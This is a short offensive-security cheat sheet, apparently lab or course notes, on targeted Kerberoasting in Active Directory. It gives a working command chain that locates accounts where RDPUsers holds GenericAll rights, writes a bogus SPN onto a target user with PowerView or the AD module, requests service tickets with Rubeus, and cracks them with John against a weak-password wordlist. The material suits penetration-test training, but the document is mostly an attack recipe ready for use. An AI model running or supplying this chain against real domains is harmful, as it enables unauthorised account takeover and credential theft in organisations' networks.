# Targeted Kerberoasting - Set-SPN
With enough rights (generic all/ generic write) a target user's SPN can be set to anything(unique in the domain) then a service ticket can be requested for kerberoasting and getting the account access. How to do it?  For exmaple we check outbound rules from bloodhound or run the below powerview command for the RDPUsers group we will see there are some supportx users on domain where rdpusers group has generic all permissions.
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
- Using Powerview, see if the supportuser already has a SPN:
```
Get-DomainUser -Identity supportuser | select serviceprincipalname
```
- Same using AD module
```
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```
- Now set SPN for that user
```
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
```
- Same as above set SPN using AD moudle
```
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'} 
```
- After this kerberoast the user
```
Rubeus.exe kerberoast /outfile:targetedhashes.txt 
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```
